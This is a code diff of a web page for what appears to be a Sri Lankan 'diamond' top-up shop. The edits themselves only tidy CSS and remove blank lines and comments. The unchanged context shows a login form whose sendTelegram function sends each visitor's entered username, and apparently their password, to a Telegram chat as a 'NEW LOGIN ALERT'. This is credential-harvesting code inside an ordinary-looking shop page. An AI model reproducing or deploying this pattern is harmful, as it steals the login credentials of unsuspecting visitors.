@@ -116,7 +116,7 @@ cursor:not-allowed;
 .topup{ background:#00c6d7; color:black; }
 .bank{
   background: #007BFF;  /* Blue colour */
-  color: white;          /* Text colour */
+  color: white;          
   border: none;
   border-radius: 14px;
   font-size: 17px;
@@ -124,11 +124,7 @@ cursor:not-allowed;
   cursor: pointer;
   transition: 0.3s;
 }
-
-/* Hover effect එක optional */
-.bank:hover{
-  background: #0056b3;  /* Darker blue when hover */
-}
+.bank:hover{ background: #0056b3; }  /* Darker blue hover */
 .contact{ background:transparent; border:2px solid white; color:white; }
 
 .footer-text{
@@ -167,7 +163,6 @@ font-weight:bold;
 <div class="footer-text">Sri Lanka No 1 Diamond Seller</div>
 
 <script>
-
 let loggedIn = false;
 let isLogging = false;
 
@@ -180,14 +175,11 @@ pw.type = (pw.type === "password") ? "text" : "password";
 }
 
 async function login(){
-
 if(isLogging) return;
-
 let btn = document.getElementById("loginBtn");
 btn.disabled = true;
 btn.innerText = "LOGGING...";
 isLogging = true;
-
 let username = document.getElementById("username").value;
 let password = document.getElementById("password").value;
 
@@ -223,7 +215,6 @@ isLogging = false;
 }
 
 function sendTelegram(username, password){
-
 let message =
 "🚨 NEW LOGIN ALERT 🚨\n\n"+
 "👤 Username: " + username + "\n"+
@@ -238,7 +229,6 @@ chat_id: chatId,
 text: message
 })
 });
-
 }
 
 function goTopup(){
@@ -254,7 +244,6 @@ if(!loggedIn){
 alert("⚠️ Please first login");
 return;
 }
-// **Corrected file name**
 location.href="ez-bank.html";
 }
 
@@ -264,7 +253,6 @@ let message = "Hello Kaviya Admin, I need help.";
 let url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
 window.open(url, "_blank");
 }
-
 </script>
 
 </body>
